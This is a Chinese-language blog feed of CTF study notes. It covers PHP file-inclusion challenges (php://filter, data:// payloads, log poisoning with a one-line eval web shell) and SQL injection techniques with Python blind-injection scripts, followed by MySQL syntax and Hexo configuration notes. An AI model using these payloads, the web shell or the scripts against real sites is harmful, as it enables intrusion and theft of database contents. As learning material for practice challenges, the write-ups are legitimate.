<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain;base64,PD9waHAgc3lzdGVtKCJwd2QiKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>3.、file协议<br>用法：<br><code>file://</code>[本地文件系统的绝对路径]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=file:///etc/passsword</span><br></pre></td></tr></table></figure>

<p>三个&#x2F; 第三个杠是根目录上的杠</p>
<p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - 个人文章 - SegmentFault 思否</a></p>
<p>ctfshow</p>
<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?=`tac f*`;?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解法一：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a10018ad-9503-4957-9de2-24a693837991.challenge.ctf.show/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>同时ua 头写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">1=system(&quot;tac f*&quot;);  //post传入</span><br></pre></td></tr></table></figure>

<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把冒号过滤了伪协议用不了</p>
<p>解法一：日志包含和上题一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://167c670e-4138-48aa-9480-9f484963d114.challenge.ctf.show/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo`tac f*`;?&gt;  //ua传入</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>easysql</title>
    <url>/2023/03/23/%E7%AE%80%E5%8D%95sql/</url>
    <content><![CDATA[<p> 我是菜狗。</p>
  <span id="more"></span>

<p>[toc]</p>
<h2 id="mysql-information-schema"><a href="#mysql-information-schema" class="headerlink" title="mysql-information_schema"></a>mysql-information_schema</h2><p>查看数据库，在<strong>schemata</strong>表中，<strong>schema_name</strong>字段中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p>查看数据库的表名 ，在<strong>tables</strong>表中，<strong>table_name</strong>字段中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27;</span><br></pre></td></tr></table></figure>

<p>猜表的列名，在<strong>columns</strong>表中，<strong>column_name</strong>字段中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;数据表名&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/Lee-404/p/12833788.html">无列名注入 - Lee-404 - 博客园 (cnblogs.com)</a></p>
<h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>依次判断类型，字段数，回显点，依次爆库名，表名，字段名，数据<br>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的列数，因此我们要对字段数进行判断</p>
<p>ctfshow web2;</p>
<p>查看当前数据库名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,database(),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>查看数据库表的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = &#x27;web2&#x27;),3 limit 1,2;#--</span><br></pre></td></tr></table></figure>

<p>数量为2</p>
<p>查第一个表的名字，**第一个表:**flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#x27;web2&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>查flag表列的数量</strong>,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>查flag表列的名字</strong>   <em>列名为flag</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>查flag表记录的数量</strong>        数量为1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>查flag表记录值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>1’ union select 1,password from ctfshow_user5 where username&#x3D;’flag’ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf.txt’ – A#生成并保存在网页目录下ctf.txt文件#ctfshowweb175</p>
<p>  if(!preg_match(‘&#x2F;[\x00-\x7f]&#x2F;i’, json_encode($ret))){<br>      $ret[‘msg’]&#x3D;’查询成功’;<br>    }<br>sql 字符注入绕过 空格 %09(tab) %20( )注释绕过&#x2F;**&#x2F;%0a%0b%0c<br> return preg_match(‘&#x2F; |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|#|file|into|select&#x2F;i’, $str);<br>%23(#) </p>
<p>-1’or(id&#x3D;26)and’a’&#x3D;’a           #括号绕过空格 ctfshow180<br>-1’ or username &#x3D; ‘flag’ –+</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>攻防世界supersqli</p>
<h3 id="查看字段"><a href="#查看字段" class="headerlink" title="查看字段"></a>查看字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by  2 #</span><br></pre></td></tr></table></figure>

<p>查看数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;--+</span><br></pre></td></tr></table></figure>

<p>查表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;;use supersqli;show tables;#</span><br></pre></td></tr></table></figure>

<p>查字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514` ;--+</span><br></pre></td></tr></table></figure>

<p>发现flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `words` ;--+</span><br></pre></td></tr></table></figure>



<p>handler查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1’;handler 1919810931114514 open;handler 1919810931114514 read first;#</span><br></pre></td></tr></table></figure>

<p> 1、打开句柄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler handler_table open;</span><br></pre></td></tr></table></figure>

<h3 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler handler_table read first; //获取第一行</span><br><span class="line">handler handler_table read next; //获取下一行</span><br></pre></td></tr></table></figure>

<p>或者通过改表名</p>
<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 ; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br><span class="line"> 拆开：</span><br><span class="line">1;  alter tables words rename to words1; </span><br><span class="line">1;  alter tables `1919810931114514` rename to words ;</span><br><span class="line">1;  alter tables words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c168d583ed0d4d7196967b28cbd0b5e9&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/l2872253606/article/details/123362430">(5条消息) 攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数</p>
<p>extractvalue函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数原型：extractvalue(xml_document,Xpath_string)</span><br><span class="line">正常语法：extractvalue(xml_document,Xpath_string);</span><br><span class="line">第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class="line">第二个参数：Xpath_string是xpath格式的字符串</span><br><span class="line">作用：从目标xml中返回包含所查询值的字符串</span><br></pre></td></tr></table></figure>

<p> ① 0x7e&#x3D;’<del>’<br> ② concat(‘a’,‘b’)&#x3D;“ab”<br> ③ version()&#x3D;@@version<br> ④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br> ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p>
<p>updatexml函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数原型：updatexml(xml_document,xpath_string,new_value)</span><br><span class="line">正常语法：updatexml(xml_document,xpath_string,new_value)</span><br><span class="line">第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串</span><br><span class="line">第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/silence1_/article/details/90812612">(8条消息) sql注入之报错注入_Dar1in9的博客-CSDN博客</a></p>
<h3 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h3><p>nssctf的题</p>
<p>用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数</p>
<p>爆出数据库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#</span><br></pre></td></tr></table></figure>

<p>爆出所有数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(schema_name) from information_schema.schemata))))#</span><br></pre></td></tr></table></figure>

<p>爆出数据库test_db下所有的表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>

<p>爆出test_db数据库下test_tb表所有的列名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;test_tb&quot; and table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>

<p>查询flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 1 , 31)))))#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 31 , 60)))))#</span><br></pre></td></tr></table></figure>

<h2 id="正则盲注"><a href="#正则盲注" class="headerlink" title="正则盲注"></a>正则盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">strs = string.printable</span><br><span class="line">url = &quot;http://x.x.x.x:8001/Less-8/index.php?id=&quot;</span><br><span class="line"></span><br><span class="line">database1 = &quot;&#x27; or database() regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line">table1 = &quot;&#x27; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line">cloumn1 = &quot;&#x27; or (select column_name from information_schema.columns where table_name=\&quot;users\&quot; and table_schema=database() limit 1,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line">data1 = &quot;&#x27; or (select username from users limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><span class="line"></span><br><span class="line">payload = database1</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for i in range(1,40):</span><br><span class="line">        char = &#x27;&#x27;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads = payload.format(name+j)</span><br><span class="line">            urls = url+payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j,end=&#x27;&#x27;)</span><br><span class="line">                char = j</span><br><span class="line">                break</span><br><span class="line">        if char ==&#x27;#&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>



<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>二分法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://d27e3b82-15f0-4e91-963c-859afc7ecaab.challenge.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # 查数据库</span><br><span class="line">         # payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line">        #查数据库</span><br><span class="line">       #  payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;&quot;</span><br><span class="line">        # 查字段</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br><span class="line">        # 查flag</span><br><span class="line">       # payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;admin&#x27; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#x27;1&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &quot;密码错误&quot;  == r.json()[&#x27;msg&#x27;]:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://e207c481-18cb-44fa-936b-eb02a0e88231.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        payload = f&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url + payload, timeout=0.5)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql</category>
      </categories>
  </entry>
  <entry>
    <title>mysql语法</title>
    <url>/2023/02/16/mysql/</url>
    <content><![CDATA[<p>mysql语法</p>
  <span id="more"></span>

<p><a href="https://blog.csdn.net/mshxuyi/article/details/88046146">(3条消息) ＭySQL 创建数据库&#x2F;表&#x2F;字段_数据库建表字段_tom.ma的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/ThinkWon/article/details/106610831">(3条消息) MySQL删除表的三种方式_mysql怎么删除表_ThinkWon的博客-CSDN博客</a></p>
<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>mysql 数据库语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p  #登陆mysql 密码为空直接回车进入</span><br></pre></td></tr></table></figure>

<p>MySQL 修改密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;newpasswd&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Show databases;</span><br><span class="line">use mysql;</span><br><span class="line">set password for root@localhost = password(&#x27;123&#x27;); 或者</span><br><span class="line">update user set password = PASSWORD(&#x27;要更换的密码&#x27;) where user = &#x27;root&#x27;;</span><br><span class="line">flush privileges；</span><br></pre></td></tr></table></figure>

<p><strong>1、查询所有数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>

<p><strong>２、创建数据库 school</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database school default character set utf8 collate utf8_general_ci;</span><br></pre></td></tr></table></figure>

<p><strong>３、进入school 数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use school;</span><br></pre></td></tr></table></figure>

<p><strong>4、显示当前数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| school     |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>5、创建空表 student</p>
<p>mysql&gt; create table student;</p>
<p>6、创建带字段的表 student (id,name,age)</p>
<pre><code>#id 整型 主建 不能为空 自动增长
#name 字符型长度50 不能为空
#age 整型 不能为空 默认值18
 
mysql&gt; create table student(
    -&gt; id int primary key not null auto_increment,
    -&gt; name varchar(50) not null,
    -&gt; age int not null default 18
    -&gt; ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
</code></pre>
<p>7、查询所有表</p>
<p>mysql&gt; show tables;</p>
<p>8、查询表结构</p>
<pre><code>mysql&gt; desc student;
+-------+-------------+------+-----+---------+----------------+
| Field | Type        | Null | Key | Default | Extra          |
+-------+-------------+------+-----+---------+----------------+
| id    | int(11)     | NO   | PRI | NULL    | auto_increment |
| name  | varchar(50) | NO   |     | NULL    |                |
| age   | int(11)     | NO   |     | 18      |                |
+-------+-------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)
</code></pre>
<p>9、查询表的详细信息</p>
<pre><code>mysql&gt; show create table student;
</code></pre>
<p>10、插入数据</p>
<pre><code>mysql&gt; insert into student (name,age) values
     &gt; (&#39;tom&#39;,20),
     &gt; (&#39;alice&#39;,16),
     &gt; (&#39;helen&#39;,22);
</code></pre>
<p>11、清空数据表内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">truncate table student;</span><br></pre></td></tr></table></figure>

<p>12、复制表结构，表数据</p>
<pre><code>#方法一
mysql&gt; create table student_2 like student;  #创建student_2表 并复制student表结构
mysql&gt; insert into student_2 select * from student;  #复制student表数据到student_2中
 
#方法二
create table student3 select * from student;  #创建 student3 并复制student表结构和数据
</code></pre>
<p>13、重命名表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename table student_3 to student_4  #重命名表为student_4</span><br></pre></td></tr></table></figure>

<p>14.删除 user 表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table user;    #drop 是直接删除表信息，速度最快，但是无法找回数据</span><br><span class="line">truncate table user;   #truncate 是删除表数据，不删除表的结构，但不能与where一起使用</span><br><span class="line">delete from user;   #delete 是删除表中的数据，不删除表结构</span><br><span class="line">delete from user where user_id = 1;  </span><br></pre></td></tr></table></figure>

<p>15.修改字段内容</p>
<p>将name为tom的记录的age设置为20并将其gender设置为female MySQL命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update student set age=20,gender=&#x27;female&#x27; where name=&#x27;tom&#x27;;</span><br></pre></td></tr></table></figure>

<p>load_file(file_name)</p>
<p>其中file_name是文件的完整路径。</p>
<p>下面是我从一个文件中选择内容的示例:</p>
<p>select load_file(‘&#x2F;data&#x2F;test.txt’) as result;</p>
<p><strong>IF表达式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>

<p>如果 expr1 是TRUE (或者expr1 &lt;&gt; 0 且 expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p>
<p>substr函数格式 (俗称：字符截取函数)</p>
<p>格式1： substr(string str, int a, int b);<br>格式2： substr(string str, int a) ;</p>
<p>解释：</p>
<p>格式1：<br>    1、str 需要截取的字符串<br>    2、a   截取字符串的开始位置<br>    （注：当a等于1时，从第一位开始截取;当a等于0时，无截取字符串）<br>    3、b   要截取的字符串的长度</p>
<p>格式2：<br>    1、str 需要截取的字符串<br>    2、a   可以理解为从第a个字符开始截取后面所有的字符串。</p>
<p>SQL函数Group_concat用法</p>
<p>拼接字符串</p>
<p><a href="https://blog.csdn.net/qq_35531549/article/details/90383022">(6条消息) SQL函数Group_concat用法_group_concat sql_寸草心2130的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>博客创建</title>
    <url>/2023/01/11/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/</url>
    <content><![CDATA[<p> layout 布置<br>    <span id="more"></span></p>
<h1 id="文章字数统计"><a href="#文章字数统计" class="headerlink" title="文章字数统计"></a>文章字数统计</h1><h3 id="Hexo-config-yml"><a href="#Hexo-config-yml" class="headerlink" title="Hexo _config.yml"></a>Hexo _config.yml</h3><p>在文件尾部添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>

<h3 id="NexT-config-yml"><a href="#NexT-config-yml" class="headerlink" title="NexT _config.yml"></a>NexT _config.yml</h3><p>修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/next-theme/hexo-word-counter</span><br><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_total: false</span><br></pre></td></tr></table></figure>

<p>设置<code>item_text_total</code>为<code>true</code></p>
<h1 id="打赏功能实现"><a href="#打赏功能实现" class="headerlink" title="打赏功能实现"></a>打赏功能实现</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Donate (Sponsor) settings</span><br><span class="line"># Front-matter variable (unsupport animation).</span><br><span class="line">reward_settings:</span><br><span class="line">  # If true, a donate button will be displayed in every article by default.</span><br><span class="line">  enable: false</span><br><span class="line">  animation: false</span><br><span class="line">  #comment: Buy me a coffee</span><br><span class="line"></span><br><span class="line">reward:</span><br><span class="line">  #wechatpay: /images/wechatpay.png</span><br><span class="line">  #alipay: /images/alipay.png</span><br><span class="line">  #paypal: /images/paypal.png</span><br><span class="line">  #bitcoin: /images/bitcoin.png</span><br></pre></td></tr></table></figure>

<p>设置属性<code>enable</code>为<code>true</code>，<code>animation</code>为<code>true</code>，添加<code>comment</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable: true</span><br><span class="line">comment: Buy me a coffee</span><br></pre></td></tr></table></figure>

<p>将微信支付和支付宝支付的截图放置在主题包下<code>source/images</code>文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wechatpay: /images/wechatpay.jpg</span><br><span class="line">alipay: /images/alipay.jpg</span><br><span class="line">#bitcoin: /images/bitcoin.jpg</span><br></pre></td></tr></table></figure>

<h1 id="live2d"><a href="#live2d" class="headerlink" title="live2d"></a>live2d</h1><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>npm install –save hexo-helper-live2d</p>
<h3 id="下载model文件"><a href="#下载model文件" class="headerlink" title="下载model文件"></a>下载model文件</h3><p>npm install live2d-widget-model-shizuku</p>
<h4 id="添加live2d看板娘到hexo"><a href="#添加live2d看板娘到hexo" class="headerlink" title="添加live2d看板娘到hexo"></a>添加live2d看板娘到hexo</h4><p>配置Hexo的主<code>_config.yml</code>或者使用的主题的<code>_config.yml</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## Live2D看板娘</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    #模板目录，在node_modules里</span><br><span class="line">    use: live2d-widget-model-shizuku  </span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 300 </span><br><span class="line">    height: 600</span><br><span class="line">  mobile:</span><br><span class="line">    # 在手机端显示</span><br><span class="line">    show: false   </span><br><span class="line">  rect:</span><br><span class="line">    opacity:0.7</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://hexo-next.readthedocs.io/zh_CN/latest/">六角形-NexT (hexo-next.readthedocs.io)</a></p>
<p><a href="https://markdown.com.cn/basic-syntax/">Markdown 基本语法 | Markdown 官方教程</a></p>
<h1 id="爱心特效"><a href="#爱心特效" class="headerlink" title="爱心特效"></a>爱心特效</h1><p><a href="https://benn314.github.io/2022/11/22/Hexo-Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E5%8A%A8%E7%94%BB">Hexo-Next主题配置教程 | Ben’s Blog (benn314.github.io)</a></p>
<p>在 <strong>&#x2F;themes&#x2F;next&#x2F;source&#x2F;js&#x2F;</strong> 下新建文件 <code>clicklove.js</code> 并添加代码：</p>
